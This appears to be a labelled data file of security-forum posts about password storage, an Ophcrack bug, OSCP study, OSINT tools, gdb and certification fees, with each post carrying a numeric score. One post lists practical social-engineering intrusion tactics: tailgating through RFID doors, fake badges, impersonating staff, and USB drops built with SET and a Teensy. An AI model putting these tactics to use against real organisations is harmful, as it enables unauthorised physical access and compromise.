3;Organsations that use plain text protocol..i all, a week ago a big company here in the uk confirmed they were using the plain text protocol.(storing password in plain text) i think this is pretty shocking but got me thinking if big companies are doing this how many small companies must be doing it as well. however this is not the only problem when it comes to passwords manyâ  sites only letting you use short passwords like 5 - 8 chars. and some are still in the age of only letting you use number and letters. we seem to be stuck in the past when it comes to passwords and for something we use all the time many people use the same passwords all over the place this does also inculde a lot of people who work in security. so with new technology why are we not all using two factor authentication ? this can be done with mobile phones you can setup paypal,google mail and online banking. another alternative now is the yubico i am big fan of this device it gives so much and is not that expensive.  i really dont understand why more companies are not implmenting this
3;Some SE tips from mei all, i wanted to share some tools and tricks that i use when doing social engineering. the best part of social engineering is you can practice it anywhere just by talking to people and trying to get information from them.   tools in my arsenal:  mobile phone  lock picks  business cards  set  teensy device  rfid card   the first thing you need is bags of confidence as you are trying to sell yourself, this is where practicing comes into play. i gained a lot of this from working in sales and selling to customers, trying to make them part with cash and buy more stuff. the company i used to work for also showed me how to manipulate people and overcome objections.  you have to be quick witted too and think fast off your feet. never try to sell yourself as someone who has certain skills when you don’t. you may be in a situation where you need to think fast to get out of it. for example you get stopped by a security guard. what are you gonna say to him ? are you just going to give up? what story will be good enough so he lets you go on your way?   the first tool that you should always have is a mobile phone this is one of the best tools ever in social engineering. the good thing about us humans is that we are either really nice people or not confident enough to interrupt someone on the phone, as that would just be so rude. speaking on the phone whilst walking into a building or hanging outside a rfid door on the phone waiting for a kind soul to hold the door open for us is just so easy. this pretty much works all of the time and it is really effective.   i tend to carry lock picks with me at all times but i very rarely used them, but the one time i might need them it’s better to have them than not.   a good business card will sell you like nothing else it’s easy to get cheap business cards printed these days and they are a great way to backup any story you are trying to sell. another good tip is if you can get a business card for someone who works at the company you are doing the social engineering attack against you might be able to go to another location and sell yourself as being that person who works for the company.   set social engineering toolkit is a great tool that works well with the teensy device. depending on your scope you can always use this to drop usb around the company and there a good chance that someone will plug it in and run the exploit on the usb.   if you are doing a social engineering attack and you know they use rfid doors you can buy a rdif card off of ebay even though it won’t work but when people see it, you can just say your card has been playing up and you need to get it sorted. most people will see the card and just let you in.   these are just a few hints and tips when doing social engineering. fill free to add tools as you see fit...
2;Ophcrack Bugf anyone has a moment to test something, i would greatly appreciate it. i think the most recent version of ophcrack for both linux and windows has a bug. ive tested this on two separate machines and am getting the same result. the problem is when ophcrack cracks a password that contains a colon. its not that it cant crack it, in fact the password  does display correctly  on the screen (both in the non gui *nix version on the screen as well as within the windows gui), but when it writes to an output file it mangles the colon. it seems every time there is a colon, it replaces it with a ---> ă (c1 in hex). i am 100% certain the password does not have this character and when i double check by checking the nt hash, it does contain a colon. bizzare, just wondering if anyone can validate my claims.  for your own testing, you can use this hash: 2d6b481f44d7f18a5acdcd7c247fa83a:a903feb8614046a6bf6dde39fd334ffc which = the password 2012:meh wt
1;How long does it usually take for a book to be considered obsolete?his has been a fear of mine for a while and its finally time to address it. some books ive acquired like counter hack: reloaded are still going to be relevant in the present/near future (namely because of the methodology of what they teach) but others seem to be one trick ponies that work against a certain webapps that have been patched up since the book was released and this goes into my current situation.  lately, ive been looking into the hackers handbook series by whiley and while they do have good reviews, a lot of them are a bit dated(2007) and i have no idea if it will be presenting problems and issues that have already been patched up.  this there some merit in this train of thought or am i just worrying too much.â    
1;Help me understando someone i know got hit with some malware recently, and im trying to understand exactly what happened, as best i can. heres the sequence. non admin user downloaded a zip file, and scanned it with mse. while mse didnt alert (strangely) it did in fact detect a trojan in the zip file and it was supposedly removed. after the scan the user preceded to unzip the supposedly now clean zip file. this triggered some kind of malware that killed mse, user immediatly took remediatory action. now, it appears to me that one of several possibilities existed... here are my thoughts: original trojan was easily detected, was this intentional, perhaps luring the target into a false sense of security? traditionally trojans drop files, or provide access through which further comprimise can occur. there have been no indicators of further comprimise, what am i missing? what caused mse to be killed? i know that commands can be executed to kill av, but they generally require admin or system privlidges, user was un-privlidged. i thought maybe some sort of client side exploit to gain privlidges. im just not sure. finally, the user immediatly pulled the network cable, scanned the computer in safe mode, and regular mode with up to date scanners (3) and nothing else was detected, but can we trust this? outside of mse which was originally killed, the other software installed at the time did not stop or detect an attack. in addition the user ran a networksniffer, and did not detect any malicious traffic after the comprimise... thoughts

3;ThreatAgent Drone - passive Open Source Intelligence (OSINT)hreatagent droneâ˘ bootstraps security assessments by providing attack surface reports for humans drone takes a different approach when it comes to passive open source intelligence (osint). it is built provide actionable intelligence on limited sources, not trying to collect "all the things". my belief is that you can be just as effective on social engineering, penetration testing, and user awareness training with smaller sets of data. an example of smaller data sets is drone only looks through the top 100 search results for linkedin. sure there could be thousands of results for any organization, but 100 will suffice for an successful attack. drone also take a similar approach with hosts, it only tries to identify the low hanging fruit and attack scenarios that are likely to happen. drone shouldnt be viewed as a final product when it comes to a security assessment or attack surface. the attack surface report can be used to bootstrap assessments and their reports. drone can also be used to educate students, organizations, and especially management on attack surface, threat modeling, and osint. drone intentionally offers less in order to provide more value which is a key principle taught in rework. i believe the organizations are inundated with too much information and struggle to make decisions to improve security. too many tools focus on scenarios that are "highly" unlikely to ever happen. sometimes less is better. instead of building tools that provide information to feed into other tools, im building tools for humans. you can follow the journey at  www.threatagent.com . source:  https://www.threatagent.com/ a short blog post from trustedsec on threatagent drone: https://www.trustedsec.com/march-2013/t ... n-testers
1;Ambitious Student New to Hackingood evening. first off, id like to say that i am new to the site. its a grand archive of resources and opportunity.im looking forward to exploring and developing it further. i am currently a 17-year-old high school student, intimidated by the oncoming future: college, jobs, responsibility, etc. i have always had an unruly obsession with computers, starting at the age of five with a brick and a command line. now i have developed this obsession into a full-blown passion. â  my ultimate goal as of right now is to eventually work my way into the nsa s expert vulnerability analysis / project management group, red cell. far off dream, yes, and many obstacles to overcome before finally realizing that goal, but i am willing to forge myself into a cyber warrior by any means necessary i do need help. i have a strong understanding of computers, feeble programming skills, a poor mathematical background (incorporated into the computer science field?), and, worst of all, no idea where to begin, even though i do have an a+, network+, ccna, and malware analysis textbook behind me.  where/ how did you guys begin your careers / hobbies / passions of being a hacker? what more can i do to get a jump start into the cyberworld of hacking? what basic skills might i need and how do i hone them to the best of my ability? am i still too young to even enter the field? i have a lot of questions, and i figured professionals like yourselves could point me in the right direction. thank you, ~ akratic p.s. this topic may be in the wrong forum section. if so, i apologize ahead of time. i may not be able to see all of the site, as i am on a kindle fire
3;End User Trainingi all, i was recently onsite for around two weeks and notice a lot of things that were lets just say plain wrong. i was not doing a security asset of any type i was just there to help the it help desk. during my time onsite i saw password being sent via email, password around computer screens and user would get up and leave me with their computer without even asking who i was. so i guess my question is other than training what other ways are there to teach end user about security ? how hard do you think the lesson should be ? i guess one of the problems with the end user is they dont care as its the company being attacked not them so do you think is ethical to target the user
1;Traffic Generatorsam trying to get some traffic generator tools and wonder if you guys could help me. i am looking for the tools which can  1. generate just volumetric protocol traffic ideally upto 10gbps  2. generate malicious traffic  3. replay pcap files 4. simulate network subnets i am open to anything opensource, commercial harware or software based. i have looked up these  1. microtik - traffic generator 2. tcpreplay 3. seagull  4. ostinato  5. ixia xm2  if you guys can list any more for generating malicious traffic (web attacks, exploits, recon) would be great. prat

3;My OSCP review - story...o here is my journey with oscp... at first for those that are wondering if they should take the course; if you never tried to perform sql injection or install apache/nginx etc.(general linux stuff) or have atleast some programming background, dont take this course for now... learn some basic stuff about programming, exploiting web applications and unix in general then register for course... because without those you are lost in my opinion. okey back on topic... so i started with 60 days course, i was lucky because i could spent any amount of time daily in the labs... my plan was to go through videos and then go to machines - in general it was good plan but the choice is per person. so i finished videos after 2 weeks, because in meantime i could not resist looking at my lab network and trying to get machines with my current knowledge !  i need to state something important : do not use metasploit on machines ! i met people on irc who struggled with machines but from talking with them i noticed that they used metasploit for every step of exploiting and that was wrong in my opinion because you wont learn anything from using metasploit. i only used metasploit on my 4 last days in labs, before that every exploit/etc. was found online and modified by me(only like 3   ) rest was useful in state that they were.  about exam : you need to know how to manage time because it is important thing... i started it 4 p.m. and i was working at machines to 4 a.m. and by that time i almost passed exam, but then i decided to take 2h nap because sitting straight 12h and working on machines was very exhausting... so i started again at 6 a.m. but nothing could click the way i wanted to:( so i decided to go bakery to get fresh bread etc. in general breakfast   after finishing it everything striked the way i wanted !  before the end of time i managed to write to "alpha" report so everything would be there... took another nap but this time it was 4h. at 8 p.m i started to finishing up report, send it after 2h and i could not sleep  ... the result was emailed to me 3 days later(i think because of defcon) - the waiting time and i have passed  to summerize: -everything is step by step so no problems in making it work -every minute i spend there was worth it ! ps. sorry for my englis
1;Swollen Foldersello!   i have a very strange problem with my freeagent goflex 500 gb external hdd, only about the half of it is actually occupied, 200-250 gb, but windows says no more than 10 gb are available. and so says linux. but when i checked it with my pals mac, it showed the adequate picture, about 50% free disk space.    it all happened last spring, i got into a really weird situation on-line, i thought my computer was hacked or infected. i was unwise enough to have the external drive connected once in a while when being on the internet. and at some point i noticed i ran out of space dramatically. i couldnt detect any suspicious / unknown folders. they just all (or some of them) had swollen to about twice its normal size. i tend to think a couple files might have been deleted but the rest appear to be ok.   the disk itself is still 465 gb as it should. i thought about buying another hdd, but i need to figure it all out and find the cause, so it never happens to me again.  unfortunately, i had very little time trying it on mac after the accident, it would have been right to check the exact sizes of folders and some files as to compare later.    i deleted some files and noticed that more space was freed. e.g. 5 gb instead of 1.5 gb. but the trick never worked again. so i have to put up with a few gb which is not ok. :smileysad:   the drive has been tested for viruses by numerous antivirus progs, no problem. seatools short tests are ok.    i have never run backup apps on it. that is, to my best knowledge.    posting this at seagate forums wasnt helpful.  could you help me out, please?    thank you! :smileyhappy
1;Security Courses & Windows XPrecently took a sans course at sans west. overall, i was really happy with the course content and delivery. yeah, its expensive, probably prohibitively for a lot of people, but there is a lot of great material in there. sans seems to make an active effort to keep their stuff current, e.g. the vm we got was windows 8. i remember being somewhat dismayed at the number of xp machines in the oscp lab, but at that time xp still had a significant share of the computing market despite being a 12+ year old os. add to that, oscp is/was technically a 101 course.  however, when my sans instructor showed a demo of an exploit on an xp, i felt a little disappointed. yes, i know it (xp) was just a vehicle to demonstrate the exploit but in the back of my mind i thought, "xp pssfth, anything can crack an xp machine." imho, using xp implies a) you havent updated your slides in a while or b) youre demonstrating something that is only vulnerable on xp. more to the point, xp makes any slide or demo appear dated and in my mind, for any non-101 course to make the claim "current", they need to eliminate xp from their material. even for a 101 course - show how vulnerable xp is and move on (win 7, 8, etc). the rest of the world is moving off xp, its time security courses do too
1;OSCP Questionsi all, im hoping to start the oscp within the next two months, i feel that im almost ready i just have a few questions that you may be able to help with. firstly - the videos: i have the understanding that when payment is confirmed, offsec will send a package including the pdf and videos. are the videos links to a hosted location or a download of the file? the reason i ask is because i was wondering if in the case of the videos being streamed, do you lose access to them once your lab time expires or do you keep them permanently? secondly - privesc: its highly warned that usage of metasploit is banned during the exam, aslong with the "getsystem" command. its no secret that a well known exploit kitrap0d is a core of this command, is the use of it allowed when not in conjunction with metasploit? apologies if the second question is too sensitive. many thanks to anyone that can help. drane
0;Help needed understanding memory locations in gdbi, im currently trying to understand how memory locations work, and im a bit confused in regards to how many bytes a memory location stores. i would really appreciate some clarity on this, and im sorry for the length of this post.  i have written this small c program to look at how integers are stored in memory:      code: #include <stdio.h>  int main(){     int i = 5;     return 0; } i know that integers require 4 bytes to be stored. so i tried debugging this in gdb on a ubuntu virtual machine, and i get the following:  ex: 1     code: (gdb) x/xw &i 0xbffff834:        0x00000005 so the way i understand this is, that memory location 0xbffff834 contains the value 5. since i have used the w format i get the result as 4 byte word in hex.  so then i tried to look at the individual bytes: ex: 2     code: (gdb) x/4xb 0xbffff834:        0x05    0x00    0x00    0x00    0x00 this does also make sense to me. now this where i get confused. when i examin the memory location and print it as 4 words in hex i get this: ex: 3     code: (gdb) x/4xw 0xbffff834 0xbffff834:    0x00000005    0xbffff898    0xb7eafebc    0x00000001 however if i do the same and show 5 words i get this:  ex: 4     code: (gdb) x/5xw 0xbffff834 0xbffff834:    0x00000005    0xbffff898    0xb7eafebc    0x00000001 0xbffff844:    0xbffff8c4 so im a bit confused how to interpret this. does the above result mean, that the memory location 0xbffff834 can contain 4 words, each being 4 bytes, thus one memory location can contain 16 bytes? the reason im confused is because when i examine each memory location indvidually i get this:  ex: 5     code: (gdb) x/xb 0xbffff834 0xbffff834:    0x05 (gdb) x/xb 0xbffff835 0xbffff835:    0x00 (gdb) x/xb 0xbffff836 0xbffff836:    0x00 (gdb) x/xb 0xbffff837 0xbffff837:    0x00 (gdb) x/xb 0xbffff838 0xbffff838:    0x98 so i interpret this as, one memory location is actually storing one byte only since, 0xbffff834 contains 0x05, and 0xbffff835 contains 0x00 in it. why does ex. 4 then seem to list 4 words at the 0xbffff834 memory location before printing the content of the next memory location 0xbffff844? is this some gdb specific thing to preserve space on the screen or somethin
3;[Article]-First Look: Cybrary Free IT Traininghis is a  blog post . to read the original post, please  click here » as a life-long learner, and someone who is passionate about both bettering myself and helping others to reach higher and achieve their goals, im constantly on the lookout for fresh educational materials particularly in the areas of it administration and security. im always amazed at the breadth of knowledge that is available, albeit, often at a substantial cost. i’m even more amazed at the amount of free content available but can’t help but be anxious about the quality, validity and dubious characters claiming to be experts just because they have a youtube channel. ive recently had the opportunity to get an up-close look at  cybrary , a relatively new online training provider with some known instructors. oh... and before i forget, i should mention - theyre free! could this be the best of both worlds?
 
 cybrarys goal is spelled out very clearly when they describe “our revolution” throughout their site. they state, “we believe it and cyber security training should be free, for everyone, forever. we believe that everyone, everywhere, deserves the opportunity to learn. what they do with the opportunity is up to them, but the opportunity should be available. join us in demanding liberation, help us in forcing change.” that’s all well and good. but how’s the actual training
2;possibly just been hackedello  i am new here and new to penetration testing. i have always had an interest in computers and hacking and thought that i would like to give this a try. i bought a book from amazon called the basics of hacking and penetration testing by patrick engebretson. i find it quite easy to read and have had some fun practicing with nmap and harvester. i got to the nessus part in chapter 3. i got nesses server online and when i was using it a little box popped up. exactly the same box that pops up when i login asking if i would like the password remembered. this password said in quotes "anonymous" and asked if i would like to keep it. does this mean that i have been hacked. i was a little worried about doing this sort of thing. when i used nessus and did a vulnerability scan i found that there was a windows issue. i cant remember what it said, something about windows sharing the internet connection or something. does that mean that by using a vmware kali linux with nessus installed can make my computer susceptable to attack? ninjama
1;A new groupello. i am bit. i am working on practicing my hacking skills to get certified as an ethical hacker, and would like to create a group for those doing the same. as of yet, i have no name for such a group, as the group is nothing but an idea at this point. id need leadership, people with experience who are willing to help us newbies, and some goals for the group. i would like to recommend these few rules for such a group: 1. create more than you destroy. a true hacker is not focused on nothing but destruction. 2. never betray your fellow members. betrayal will lead to nothing but pain, not only for you, but for everyone else. 3. always try to learn something new about security as you go on. as a hacker, youre never a master, but keeping up will ensure that youre as close to being a master as one can be. so, whos with me
3;Membership Fee for EC-Council Certified Membersc-council introduced annual maintenance fees: please be advised, effective january 1, 2016, ec-council will be initiating the requirement for membership fees for all certified members holding ec-council certifications. in the year 2012, ec-council had announced that it would be initiating this membership fee structure in 2016. we are proud to say our certification membership base continues to grow at a steady rate and the cyber security field is growing as a whole. just this year, ec-council has received “cyber security company of the year award”. the year before, we received the “dhs/nsa industry achievement award” at the cisse colloquium for advances in cyber security professionalization. these awards received are evidence of the work we continue to do to add tangible industry recognition and value in our certification programs. we also now have a fully accredited online university- ec-council university, which produces cyber leaders of the future. we are proud to maintain our ansi 17024 status. we are proud to be one of the world’s largest technical infosec certification bodies with over 140,000 certified members in 140 countries across the globe. holding a certification from ec-council comes with many benefits and advantages but comes at an immense cost of maintenance to ec-council. to continue to provide these benefits and elevate the value of ec-council certifications in the market, ec-council has no choice but to implement a certification maintenance fee of $80.00 per annum. the ec-council continuing education requirements, which calls for the maintenance of certification through continuing education credits is still in effect and it is important you maintain currency in the profession. we understand that the certification maintenance fee may be burdensome to some of our members. to offset the cost of certification maintenance, we have devised a plan to provide direct value to you, our certification holder. for the year 2016, we are proud to announce that any member certified or recertified from january 1st 2016 onwards and continues chooses to keep their certification active will be eligible to receive one free one free certification exam voucher upon completion of their latest ece cycle, with values ranging from usd $125 to usd $650. if the member redeems this voucher, and takes the exam and pass, they will not need to worry about accumulating your required 120 cpe points for the next 3 years! members are also eligible to receive exclusive discounts to attend ec-council foundation events such as hacker halted and take down con as well as a discounts on additional ec-council certification programs and material
